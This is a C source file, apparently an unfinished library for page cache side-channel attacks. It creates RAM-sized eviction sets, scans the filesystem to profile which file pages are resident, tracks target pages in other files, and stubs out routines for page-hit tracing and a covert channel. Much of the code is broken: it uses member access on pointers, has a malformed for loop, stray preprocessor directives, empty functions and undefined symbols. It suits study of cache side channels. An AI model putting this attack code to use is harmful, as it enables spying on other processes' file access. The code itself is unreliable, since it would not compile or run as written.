#include "pca.h"
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <ctype.h>
#include <errno.h>
#include <pthread.h>
#ifdef _linux
#include <fcntl.h>
#include <fts.h>
#include <memory.h>
#include <semaphore.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/statvfs.h>
#include <sys/sysinfo.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>
#include <wait.h>
#include <zconf.h>
#include <assert.h>
#include <limits.h>
#elif defined(__WIN32)
#include "windows.h"
#endif
#include "debug.h"


/*-----------------------------------------------------------------------------
 * GLOBAL VARIABLES
 */
static size_t PAGE_SIZE = 0;
static size_t TOTAL_RAM_BYTES = 0;
static int MAX_PUS = 0;

static int running = 0;
static int used_pus = 0;


/*-----------------------------------------------------------------------------
 * HELPER FUNCTIONS FOR CUSTOM DATATYPES
 */
void initCachedFile(CachedFile *cached_file)
{
    memset(cached_file, 0, sizeof(CachedFile));
    initFileMapping(&cached_file->mapping_);
    // do not waste memory at initialization
    // can not fail because no memory is reserved
    dynArrayInit(&cached_file->resident_page_sequences_, sizeof(PageSequence), 0);
}


void closeCachedFile(void *arg)
{
    CachedFile *cached_file = arg;

    closeFileMapping(&cached_file->mapping_);
    dynArrayDestroy(&cached_file->resident_page_sequences_, NULL);
}


void closeCachedFileArrayFreeOnly(void *arg)
{
    CachedFile *cached_file = arg;

    dynArrayDestroy(&cached_file->resident_page_sequences_, NULL);
}


void initFillUpProcess(FillUpProcess *fp)
{
    memset(fp, 0, sizeof(FillUpProcess));
    fp->pid_ = -1;
}


void closeFillUpProcess(void *arg)
{
    FillUpProcess *fp = arg;

    // TODO what do to here??
    if (fp->pid_ != 0)
    {
        osal_process_kill(fp->pid_);
    }
    fp->pid_ = 0;
}


void closeThread(void *arg)
{
    pthread_t *thread = arg;

    pthread_join(*thread, NULL);
}


int initAttackEvictionSet(AttackEvictionSet *es)
{
    memset(es, 0, sizeof(AttackEvictionSet));
    initFileMapping(&es->mapping_);
    // only used if ES_USE_THREADS is defined
    if(sem_init(&es->worker_start_sem_, 0, 0) != 0)
    {
        return -1;
    }
    if(sem_init(&es->worker_join_sem_, 0, 0) != 0)
    {
        return -1;
    }
    if(!dynArrayInit(&es->access_threads_, sizeof(PageAccessThreadESData), PCA_ARRAY_INIT_CAP))
    {
        return -1;
    }

    return 0;
}


void closeAttackEvictionSet(AttackEvictionSet *es)
{
    // only used if ES_USE_THREADS is defined
    dynArrayDestroy(&es->access_threads_, closePageAccessThreadESData);
    sem_destroy(&es->worker_start_sem_);
    sem_destroy(&es->worker_join_sem_);
    //-------------------------------------------------------------------------
     closeFileMapping(&(es->mapping_));
}


int initAttackWorkingSet(AttackWorkingSet *ws)
{
    memset(ws, 0, sizeof(AttackWorkingSet));
    if (!dynArrayInit(&ws->access_threads_, sizeof(PageAccessThreadWSData), PCA_ARRAY_INIT_CAP))
    {
        return -1;
    }
    listInit(&ws->resident_files_, sizeof(CachedFile));
    listInit(&ws->non_resident_files_, sizeof(CachedFile));
    listInit(&ws->tmp_resident_files_, sizeof(CachedFile));
    listInit(&ws->tmp_non_resident_files_, sizeof(CachedFile));

    return 0;
}


void closeAttackWorkingSet(AttackWorkingSet *ws)
{
    dynArrayDestroy(&ws->access_threads_, closePageAccessThreadWSData);
    listDestroy(&ws->resident_files_, closeCachedFile);
    listDestroy(&ws->non_resident_files_, closeCachedFile);
    listDestroy(&ws->tmp_resident_files_, closeCachedFile);
    listDestroy(&ws->tmp_non_resident_files_, closeCachedFile);
}


int initAttackBlockingSet(AttackBlockingSet *bs)
{
    memset(bs, 0, sizeof(AttackBlockingSet));
    if (!dynArrayInit(&bs->fillup_processes_, sizeof(FillUpProcess), PCA_ARRAY_INIT_CAP))
    {
        return -1;
    }
    if (sem_init(&bs->initialized_sem_, 0, 0) != 0)
    {
        return -1;
    }

    return 0;
}


void closeAttackBlockingSet(AttackBlockingSet *bs)
{
    dynArrayDestroy(&bs->fillup_processes_, closeFillUpProcess);
    sem_destroy(&bs->initialized_sem_);
}


int initAttackSuppressSet(AttackSuppressSet *ss)
{
    memset(ss, 0, sizeof(AttackSuppressSet));
    if (!dynArrayInit(&ss->target_readahead_window_, sizeof(void *), PCA_ARRAY_INIT_CAP))
    {
        return -1;
    }

    return 0;
}


void closeAttackSuppressSet(AttackSuppressSet *ss)
{
    dynArrayDestroy(&ss->target_readahead_window_, NULL);
}


void initPageAccessThreadESData(PageAccessThreadESData *page_access_thread_es_data)
{
    memset(page_access_thread_es_data, 0, sizeof(PageAccessThreadESData));
}


void closePageAccessThreadESData(void *arg)
{
    PageAccessThreadESData *page_access_thread_es_data = arg;
    // ensures thread stops when currently inside sem_wait
    pthread_cancel(page_access_thread_es_data->tid_);
    pthread_join(page_access_thread_es_data->tid_, NULL);
}


void initPageAccessThreadWSData(PageAccessThreadWSData *page_access_thread_ws_data)
{
    memset(page_access_thread_ws_data, 0, sizeof(PageAccessThreadWSData));
    pthread_mutex_init(&page_access_thread_ws_data->resident_files_lock_, NULL);
}


void closePageAccessThreadWSData(void *arg)
{
    PageAccessThreadWSData *page_access_thread_ws_data = arg;

    if (page_access_thread_ws_data->running_)
    {
        __atomic_store_n(&page_access_thread_ws_data->running_, 0, __ATOMIC_RELAXED);
        pthread_join(page_access_thread_ws_data->tid_, NULL);
        pthread_attr_destroy(&page_access_thread_ws_data->thread_attr_);
    }
}


void initTargetFile(TargetFile *target_file) 
{
    initFileMapping(&target_file->mapping_);
    // can not fail, initial size is 0
    dynArrayInit(&target_file->target_pages_, sizeof(TargetPage), 0);
}


void closeTargetFile(void *arg) 
{
    TargetFile *target_file = arg;
    closeFileMapping(&target_file->mapping_);
    dynArrayDestroy(&target_file->target_pages_, NULL);
}


int initAttack(Attack *attack)
{
    memset(attack, 0, sizeof(Attack));

    if (initAttackEvictionSet(&attack->eviction_set_) != 0)
    {
        return -1;
    }

    if (initAttackWorkingSet(&attack->working_set_) != 0)
    {
        return -1;
    }

    if (initAttackBlockingSet(&attack->blocking_set_) != 0)
    {
        return -1;
    }

    if (hashMapInit(&attack->targets_, sizeof(TargetFile), 1023) != 0)
    {
        return -1;
    }

    if (initAttackSuppressSet(&attack->suppress_set_) != 0)
    {
        return -1;
    }

    if (!dynArrayInit(&attack->ss_threads_, sizeof(pthread_t), PCA_ARRAY_INIT_CAP))
    {
        return -1;
    }

    initFileMapping(&attack->event_obj_);

    return 0;
}


void freeAttack(Attack *attack)
{
    // join all threads and kill all processes
    if (attack->event_child_ != 0)
    {
        kill(attack->event_child_, SIGKILL);
    }
    dynArrayDestroy(&attack->ss_threads_, closeThread);
    pthread_join(attack->bs_manager_thread_, NULL);
    closeAttackBlockingSet(&attack->blocking_set_);
    pthread_join(attack->ws_manager_thread_, NULL);

    // in reverse close remaining files, unmap and free memory
    closeAttackSuppressSet(&attack->suppress_set_);
    closeAttackWorkingSet(&attack->working_set_);
    closeAttackEvictionSet(&attack->eviction_set_);
    hashMapDestroy(&attack->targets_, closeTargetFile);
    closeFileMapping(&attack->event_obj_);
}


/*-----------------------------------------------------------------------------
 * FUNCTIONS RELATED TO ATTACK
 */

// initialise attack, gets information which stays valid
int pcaInit(Attack *attack) 
{
    int ret = 0;
    struct sysinfo system_info;

    // get system page size
    PAGE_SIZE = sysconf(_SC_PAGESIZE);
    if (PAGE_SIZE == -1)
    {
        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at syscconf...\n", OSAL_EC));
        goto error;
    }

    // get system information
    ret = sysinfo(&system_info);
    if (ret != 0)
    {
        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at sysinfo...\n", OSAL_EC));
        goto error;
    }
    TOTAL_RAM_BYTES = system_info.totalram;

    // TODO windows would need different api does this even pay off??
    // evaluate and throw out if proves unhelpful 
    // get number of cpus
    MAX_PUS = get_nprocs();
    DEBUG_PRINT((DEBUG "%d PUs available...\n", MAX_PUS));

    if(initAttack(attack) != 0) 
    {
        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at initAttack...\n", OSAL_EC));
        goto error;
    } 

    return 0;
error:
    freeAttack(attack);
    return -1;
}

// TODO replace "Error (%s)" with Error " OSAL_ERROR_CODE_FORMAT_STRING "
int pcaStart(Attack *attack, int flags)
{
    int ret = 0;
    cpu_set_t cpu_mask;
    pthread_attr_t thread_attr;

    // later used to set thread affinity
    pthread_attr_init(&thread_attr);

    // limit execution on CPU 0 by default
    CPU_ZERO(&cpu_mask);
    CPU_SET(0, &cpu_mask);
    sched_setaffinity(0, sizeof(cpu_mask), &cpu_mask);
    used_pus = (used_pus + PU_INCREASE < MAX_PUS) ? used_pus + PU_INCREASE : used_pus;


    // profile system working set if wanted
    if (attack->use_attack_ws_)
    {
        DEBUG_PRINT((DEBUG "Profiling working set...\n"));
        if (profileAttackWorkingSet(attack) != 0)
        {
            DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at profileAttackWorkingSet...\n", OSAL_EC));
            goto error;
        }


        // TODO move to main
        printf(INFO "%zu files with %zu mapped bytes of sequences bigger than %zu pages are currently resident in memory.\n",
               attack.working_set_.resident_files_.count_, attack.working_set_.mem_in_ws_, attack.working_set_.ps_add_threshold_);
    }

    // create + map attack eviction set
    DEBUG_PRINT((DEBUG "Trying to create a %zu MB eviction set.\nThis might take a while...\n", 
        TOTAL_RAM_BYTES / 1024 / 1024));
    ret = createEvictionSet(attack);
    if (ret != 0)
    {
        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at createEvictionSet...\n", OSAL_EC));
        goto error;
    }

    // TODO fix their function later
    // if wanted use eviction threads
    if(attack->eviction_set_.use_access_threads_)
    {
        if (spawnESThreads(attack) != 0)
        {
            DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at spawnESThreads...\n", OSAL_EC));
            goto error;
        }
    }

    // TODO fix later
    // spawn surpressing set worker threads
    if (spawnSuppressThreads(attack) != 0)
    {
        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at spawnSuppressThreads...\n", OSAL_EC));
        goto error;
    }

    // start manager for working set
    if (attack->use_attack_ws_ && pthread_create(&attack.ws_manager_thread_, &thread_attr, wsManagerThread, &attack.working_set_) != 0)
    {
        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at pthread_create...\n", OSAL_EC));
    }
    
    // start manager for blocking set
    if (attack->use_attack_bs_)
    {
        if (pthread_create(&attack->bs_manager_thread_, &thread_attr, bsManagerThread, &attack.blocking_set_) != 0)
        {
            DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at pthread_create...\n", OSAL_EC));
        }
        else
        {
            // wait till blocking set is initialized
            sem_wait(&attack.blocking_set_.initialized_sem_);
        }
    }









    // TODO not really sure that brings any benefit
    // next thread(s) by default on different core
    CPU_ZERO(&cpu_mask);
    CPU_SET(used_pus, &cpu_mask);
    pthread_attr_setaffinity_np(&thread_attr, sizeof(cpu_set_t), &cpu_mask);
    used_pus = (used_pus + PU_INCREASE < MAX_PUS) ? used_pus + PU_INCREASE : used_pus;







    // profile working set
    // start all threads and so on
    // ...


    // Windows -> what do we do about the attack working set???
    // best would be to keep it in new processes 
    // but how to share -> shared memory etc??


    // windows needs a second init function as some stuff there can only happen with support 
    // of the main application -> flags

error:

    return -1;
}


// teardown
void pcaExit(Attack *attack)
{
    // TODO stop running threads
    exitAttack(attack);
}


TargetFile *pcaAddTargetFile(Attack *attack, char *target_file_path)
{
    char target_file_path_abs[OSAL_MAX_PATH_LEN];
    TargetFile target_file;
    TargetFile *target_file_ptr = NULL;

    // get absolute path
    if(osal_fullpath(target_file_path, target_file_path_abs) == NULL)
    {
        return NULL;
    }

    // map target file and add to targets hash map
    initTargetFile(&target_file);
    if(mapFile(&target_file.mapping_, target_file_path, FILE_ACCESS_READ | FILE_NOATIME, 
        MAPPING_SHARED | MAPPING_ACCESS_READ) != 0)
    {
        closeTargetFile(&target_file);
        return NULL;
    }
    hashMapInsert(&attack->targets_, target_file_path_abs, strlen(target_file_path_abs), 
        &target_file);
    if(target_file_ptr == NULL)
    {
        closeTargetFile(&target_file);
        return NULL;
    }

    return target_file_ptr;
}


int pcaAddTargetsFromFile(Attack *attack, char *targets_config_file_path)
{
    int ret = 0;
    FILE *targets_config_file = NULL;
    char *line_buffer[PCA_TARGETS_CONFIG_MAX_LINE_LENGTH] = {0};
    size_t line_length = 0;
    int parse_pages = 0;
    char current_target_path_abs[OSAL_MAX_PATH_LEN];
    TargetFile current_target_file;
    
    // open targets config file
    targets_config_file = fopen(targets_config_file_path, "r");
    if(targets_config_file == NULL) 
    {
        return -1;
    }

    // init current target file
    initTargetFile(&current_target_file);
    while(1) 
    {
        // read one line
        if(fgets(line_buffer, PCA_TARGETS_CONFIG_MAX_LINE_LENGTH, targets_config_file) == NULL)
        {
            if(feof(targets_config_file)) 
            {
                break;
            }
            else 
            {
                goto error;
            }
        }

        // check for new line character (must be in array)
        // and remove it
        if(line_buffer[line_length - 1] != '\n') 
        {
            goto error;
        }
        line_buffer[--line_length] = 0;

        // empty line -> new file
        if(line_length == 0) 
        {
            // can not be zero at this point -> syntax error
            if(parse_pages == 0)
            {
                goto error;
            }

            // insert processed target file
            if(hashMapInsert(&attack->targets_, current_target_path_abs, strlen(current_target_path_abs), 
                &current_target_file) == NULL)
            {
                goto error;
            }
            // init new target file
            initTargetFile(&current_target_file);
            parse_pages = 0;
        }

        if(parse_pages)
        {
            TargetPage target_page;
            int no_eviction = 0;

            if(sscanf(line_buffer, "%lx %d", &target_page.offset_, &no_eviction) != 2) 
            {
                goto error;
            }
            if(no_eviction != 0 && no_eviction != 1) 
            {
                goto error;
            }
            target_page.no_eviction_ = no_eviction;

            // check for out of bounds
            if(target_page.offset_ > current_target_file.mapping_.size_pages_) 
            {
                goto error;
            }

            // append target page to file
            if(dynArrayAppend(&current_target_file.target_pages_, &target_page) == NULL) 
            {
                goto error;
            }
        }
        else 
        {
            // get absolute path
            if(osal_fullpath(line_buffer, current_target_path_abs) == NULL)
            {
                goto error;
            }
            // map target file
            if(mapFile(&current_target_file.mapping_, current_target_path_abs, FILE_ACCESS_READ | FILE_NOATIME, 
                MAPPING_ACCESS_READ | MAPPING_SHARED) != 0) 
            {
                goto error;
            }
            // parse pages next
            parse_pages = 1;
        }
    }

    goto cleanup;
error:
    ret = -1;
    dynArrayDestroy(&attack->targets_, closeTargetFile);
cleanup:
    if(targets_config_file != NULL) 
    {
        fclose(targets_config_file);
    }
    closeTargetFile(&current_target_file);

    return ret;
}


// for single page hit tracing
int pcaTargetPagesSampleFlushOnce(Attack *attack) 
{

}


// for profiling
int pcaTargetFilesSampleFlushOnce(Attack *attack)
{

}


// for covert channel
int pcaTargetFileSampleFlushRangeOnce(Attack *attack, TargetFile *target_file)
{

}

int createEvictionSet(Attack *attack)
{
    int ret = 0;

    if(!attack->eviction_set_.use_anon_memory_)
    {
        // file eviction set
        ret = createRandomFile(attack->eviction_set_.eviction_file_path_, TOTAL_RAM_BYTES);
        if (ret != 0)
        {
            DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at createRandomFile...\n", OSAL_EC));
            goto error;
        }
        if (mapFile(&attack->eviction_set_.mapping_, attack->eviction_set_.eviction_file_path_, 
            FILE_ACCESS_READ | FILE_NOATIME, MAPPING_SHARED | MAPPING_ACCESS_READ) != 0)
        {
            DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at mapFile for: %s ...\n", OSAL_EC, 
                attack->eviction_set_.eviction_file_path_));
            goto error;
        }
    }
    else 
    {
        // anonymous eviction set
        if (mapAnon(&attack->eviction_set_.mapping_, TOTAL_RAM_BYTES, MAPPING_PRIVATE 
            | MAPPING_ACCESS_READ | MAPPING_ACCESS_WRITE | MAPPING_NORESERVE) != 0)
        {
            DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at mapFile for: %s ...\n", OSAL_EC, 
                attack->eviction_set_.eviction_file_path_));
            goto error;
        }
    }

    return 0;
error:
    closeFileMapping(&attack->eviction_set_.mapping_);
    return -1;
}

size_t evictTargets(Attack *attack, IsTargetEvictedFn target_evicted_fn, void *target_evicted_arg_ptr) 
{
    if(!attack->eviction_set_.use_access_threads_)
    {
        return evictTargets_(attack, target_evicted_fn, target_evicted_arg_ptr);

    }
    else
    {
        return evictTargetsThreads_(attack, target_evicted_fn, target_evicted_arg_ptr);
    }
}

size_t evictTargets_(Attack *attack, IsTargetEvictedFn target_evicted_fn, void *target_evicted_arg_ptr)
{
    volatile uint8_t tmp = 0;
    (void)tmp;
    ssize_t accessed_mem = 0;

    // TODO fix
    // flag eviction running
    __atomic_store_n(&eviction_running, 1, __ATOMIC_RELAXED);

    for (size_t p = 0; p < attack->eviction_set_.mapping_.size_pages_; p++)
    {
        // check if evicted
        if (accessed_mem % attack->eviction_set_.targets_check_all_x_bytes_ == 0 &&
            target_evicted_fn(target_evicted_arg_ptr))
        {
          break;
        }

        // access ws
        if (accessed_mem % attack->eviction_set_.ws_access_all_x_bytes_ == 0)
        {
            // TODO access working set
        }

        // prefetch larger blocks (more efficient IO)
        if (accessed_mem % attack->eviction_set_.prefetch_es_bytes_ == 0)
        {
            if(adviseFileUsage(&attack->eviction_set_.mapping_, accessed_mem, 
                attack->eviction_set_.prefetch_es_bytes_, USAGE_WILLNEED) != 0)
            {
                DEBUG_PRINT((DEBUG "Warning error " OSAL_EC_FS " at adviseFileUsage...\n", OSAL_EC));
            }
        }

        // access page
        if(!attack->eviction_set_.use_file_api_) 
        {
#ifdef __linux
            if (pread(attack->eviction_set_.mapping_.internal_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1 ||
                pread(attack->eviction_set_.mapping_.internal_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1 )
            {
                // in case of error just print warnings and access whole ES
                DEBUG_PRINT((DEBUG "Warning error " OSAL_EC_FS " at pread...\n", OSAL_EC));
            }
#elif defined(_WIN32)

#endif
        }
        else 
        {
            tmp = *((uint8_t *)attack->eviction_set_.mapping_.addr_ + p * PAGE_SIZE);
        }

        accessed_mem += PAGE_SIZE;
    }

    // remove eviction set to release pressure
    if(adviseFileUsage(&attack->eviction_set_.mapping_, 0, 
                attack->eviction_set_.mapping_.size_, USAGE_DONTNEED) != 0)
    {
        DEBUG_PRINT((DEBUG "Warning error " OSAL_EC_FS " at adviseFileUsage...\n", OSAL_EC));
    }

    // flag eviction done
    __atomic_store_n(&eviction_running, 0, __ATOMIC_RELAXED);

#ifdef _DETAILED_EVICTION_SET_STAT_
    printf(INFO "[Eviction Set] Resident pages: %zu kB, access time: %zu us\n", already_resident * PAGE_SIZE / 1024, t_resident / 1000);
    printf(INFO "[Eviction Set] Non resident pages: %zu kB, access time: %zu us\n", (accessed_mem - already_resident * PAGE_SIZE) / 1024, t_non_resident / 1000);
#endif

    return accessed_mem;
}


size_t evictTargetPage(Attack *attack)
{
    size_t accessed_mem_sum = 0;

    // flag eviction running
    __atomic_store_n(&eviction_running, 1, __ATOMIC_RELAXED);

    // resume worker threads
    for (size_t t = 0; t < attack->eviction_set_.access_thread_count_; t++)
    {
        // in case of error skip
        if (sem_post(&attack->eviction_set_.worker_start_sem_) != 0)
        {
            printf(WARNING "Error (%s) at sem_post...\n", strerror(errno));
            continue;
        }
    }

    // wait for completion of the worker threads
    for (size_t t = 0; t < attack->eviction_set_.access_thread_count_; t++)
    {
        // in case of error skip
        if (sem_wait(&attack->eviction_set_.worker_join_sem_) != 0)
        {
            printf(WARNING "Error (%s) at sem_wait...\n", strerror(errno));
            continue;
        }

        PageAccessThreadESData *thread_data = dynArrayGet(&attack->eviction_set_.access_threads_, t);
        accessed_mem_sum += thread_data->accessed_mem_;
    }

    // flag eviction done
    __atomic_store_n(&eviction_running, 0, __ATOMIC_RELAXED);

    return accessed_mem_sum;
}

#else


#endif





int profileResidentPagesFile(Attack *attack, char *file_path) 
{
    CachedFile current_cached_file;
    TargetFile *target_file = NULL;
    DEBUG_PRINT((DEBUG "Found possible shared object: %s\n", file_path));

    // check if the found file matches the eviction file or the target and skip if so
    if (strcmp(file_path, attack->eviction_set_.eviction_file_path_) == 0)
    {
        DEBUG_PRINT((DEBUG "Shared object %s is the eviction file, skipping...\n", file_path));
        return -1;
    }

    // prepare cached file object
    initCachedFile(&current_cached_file);
    // open file, do not update access time (faster), skip in case of errors            
    if (mapFile(&current_cached_file.mapping_, file_path, FILE_ACCESS_READ | FILE_NOATIME, MAPPING_ACCESS_READ | MAPPING_SHARED) < 0)
    {
        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at mapping of file: %s...\n", OSAL_EC, file_path));
        goto error;
    }
    // advise random access to avoid readahead (we dont want to change the working set)
    adviseFileUsage(&current_cached_file.mapping_, 0, 0, FILE_USAGE_RANDOM);

    // get status of the file pages
    if (getCacheStatusFile(&current_cached_file.mapping_) != 0)
    {
        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at getCacheStatusFile...\n", OSAL_EC));
        goto error;
    }

    // if file is a target file, zero pages inside the target pages readahead window
    target_file = hashMapGet(&attack->targets_, file_path, strlen(file_path));
    if (target_file != NULL) 
    {
        targetFileCacheStatusMaskReadahead(target_file, &current_cached_file.mapping_, attack->ra_window_size_pages_);
    }

    // parse page sequences, skip in case of errors
    if (profileResidentPageSequences(&current_cached_file, attack->working_set_.ps_add_threshold_) < 0)
    {
        DEBUG_PRINT((DEBUG "Error at profileResidentPageSequences: %s...\n", file_path));
        goto error;
    }

    // no page sequences -> close object
    if (current_cached_file.resident_page_sequences_.size_ == 0)
    {
        closeCachedFile(&current_cached_file);
    }
    // else add current cached file to cached files
    else
    {
        // skip in case of errors
        if (!listAppendBack(&attack->working_set_.resident_files_, &current_cached_file))
        {
            goto error;
        }
    }

    // statistics
    attack->working_set_.checked_files_++;
    attack->working_set_.memory_checked_ += current_cached_file.mapping_.size_;
    attack->working_set_.mem_in_ws_ += current_cached_file.resident_memory_;

    // cleanup
#ifdef WS_MAP_FILE
    closeFileOnly(&current_cached_file.mapping_);
#else
    closeMappingOnly(&current_cached_file.mapping_);
#endif
    freeFileCacheStatus(&current_cached_file.mapping_);
    return 0;

error:
    closeCachedFile(&current_cached_file);
    return -1;
}


void targetFileCacheStatusMaskReadahead(TargetFile *target_file, FileMapping *target_file_mapping, size_t ra_window_size_pages) 
{
    size_t back_ra_trigger_window = ra_window_size_pages / 2 - 1;
    size_t front_ra_trigger_window = ra_window_size_pages / 2;

    for(size_t t = 0; t < target_file->target_pages_.size_; t++)
    {
        TargetPage *target_page = dynArrayGet(&target_file->target_pages_, t);
        if(target_page->offset_ < ra_window_size_pages) 
        {
            // trim pages in back that could trigger readahead
            for(ssize_t p = target_page->offset_; p >= 0; p--)
                target_file_mapping->pages_cache_status_[p] = 0;
        }
        else 
        {
            // trim pages in back that could trigger readahead
            for(ssize_t p = target_page->offset_; p >= target_page->offset_ - back_ra_trigger_window; p--)
                target_file_mapping->pages_cache_status_[p] = 0;
        }
        // trim pages in front that could trigger readahead
        for(ssize_t p = target_page->offset_; p <= MAX(target_page->offset_ + front_ra_trigger_window, target_file_mapping->size_pages_ - 1); p++)
            target_file_mapping->pages_cache_status_[p] = 0;
    }
}


int profileResidentPageSequences(CachedFile *current_cached_file, size_t ps_add_threshold)
{
    int ret = 0;
    unsigned char *page_status = NULL;
    PageSequence sequence = {0};

    // reset array size to zero
    dynArrayReset(&current_cached_file->resident_page_sequences_);
    // reset resident memory
    current_cached_file->resident_memory_ = 0;

    // check for sequences and add them
    for (size_t p = 0; p < current_cached_file->mapping_.size_pages_; p++)
    {
        if (current_cached_file->mapping_.pages_cache_status_[p] & 1)
        {
            if (sequence.length_ == 0)
            {
                sequence.offset_ = p;
            }

            sequence.length_++;
        }
        else
        {
            // add sequence if greater equal than threshold
            if (sequence.length_ >= ps_add_threshold)
            {
                // add sequence pages
                if (!dynArrayAppend(&current_cached_file->resident_page_sequences_, &sequence))
                {
                    DEBUG_PRINT((DEBUG "Error at dynArrayAppend...\n"));
                    goto error;
                }

                current_cached_file->resident_memory_ += sequence.length_ * PAGE_SIZE;
                DEBUG_PRINT((DEBUG "Added page sequence with page offset %zu and %zu pages\n",
                             sequence.offset_, sequence.length_));
                // reset sequence length
                sequence.length_ = 0;
            }
        }
    }
    // process last found sequence
    if (sequence.length_ >= ps_add_threshold)
    {
        // add sequence pages
        if (!dynArrayAppend(&current_cached_file->resident_page_sequences_, &sequence))
        {
            DEBUG_PRINT((DEBUG "Error at dynArrayAppend...\n"));
            goto error;
        }

        current_cached_file->resident_memory_ += sequence.length_ * PAGE_SIZE;
        DEBUG_PRINT((DEBUG "Added page sequence with page offset %zu and %zu pages\n",
                     sequence.offset_, sequence.length_));
    }

    return ret;

error:

    ret = -1;
    dynArrayDestroy(&current_cached_file->resident_page_sequences_, NULL);
    current_cached_file->resident_memory_ = 0;
}


int pageSeqCmp(void *node, void *data)
{
    if (((PageSequence *)data)->length_ > ((PageSequence *)node)->length_)
    {
        return 1;
    }

    return 0;
}


#ifdef __linux
int profileAttackWorkingSet(Attack *attack)
{
    FTS *fts_handle = NULL;
    FTSENT *current_ftsent = NULL;
    int ret = 0;

    // use fts to traverse over all files in the searchpath
    fts_handle = fts_open(attack->working_set_.search_paths_, FTS_PHYSICAL, NULL);
    if (fts_handle == NULL)
    {
        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at fts_open...\n", OSAL_EC));
        return -1;
    }

    while (running)
    {
        current_ftsent = fts_read(fts_handle);
        // error at traversing files
        if (current_ftsent == NULL && errno)
        {
            // catch too many open files error (end gracefully)
            if (errno == EMFILE)
            {
                DEBUG_PRINT((DEBUG "Too many open files at fts_read, ignoring rest of files...\n"));
                break;
            }

            DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at fts_read...\n", OSAL_EC));
            goto error;
        }
        // end
        else if (current_ftsent == NULL)
        {
            break;
        }

        // regular file
        if (current_ftsent->fts_info == FTS_F)
        {
            // if failed for one file ignore and just try the next one
           profileResidentPagesFile(attack, current_ftsent->fts_path);
        }
    }
            
    goto cleanup;
error:
    ret = -1;
    listDestroy(&attack->working_set_.resident_files_, closeCachedFile);

cleanup:
    fts_close(fts_handle);

    return ret;
}
#elif defined (_WIN32)
static int profileAttackWorkingSetFolder(Attack *attack, char *folder)
{
    char *full_pattern[OSAL_MAX_PATH_LEN];
    WIN32_FIND_DATA find_file_data;
    HANDLE handle;

    // go through all files and subdirectories
    PathCombineA(full_pattern, folder, "*");
    handle = FindFirstFileA(full_pattern, &find_file_data);
    if(handle == INVALID_HANDLE_VALUE)
    {
        if(GetLastError() == ERROR_FILE_NOT_FOUND)
        {
            return 0;
        }

        return -1;
    }

    do
    {
        PathCombineA(full_pattern, folder, find_file_data.cFileName);
        if(find_file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            if(profileAttackWorkingSetFolder(attack, full_pattern, pattern) != 0) 
            {
               return -1; 
            }
        }
        else 
        {
            profileResidentPagesFile(attack, full_pattern);                
        }
    } while(FindNextFile(handle, &find_file_data));
    
    FindClose(handle);
    return 0;
}

int profileAttackWorkingSet(Attack *attack)
{
    int ret = 0;

    for(size_t i < 0; attack->working_set_.search_paths_[i] != NULL && running; i++) 
    {
        if(profileAttackWorkingSetFolder(attack, attack->working_set_.search_paths_[i]) != 0)
        {
            goto error;
        }
    }
    
    return 0;

error:
    ret = -1;
    listDestroy(&attack->working_set_.resident_files_, closeCachedFile);
    return ret;
}
#endif


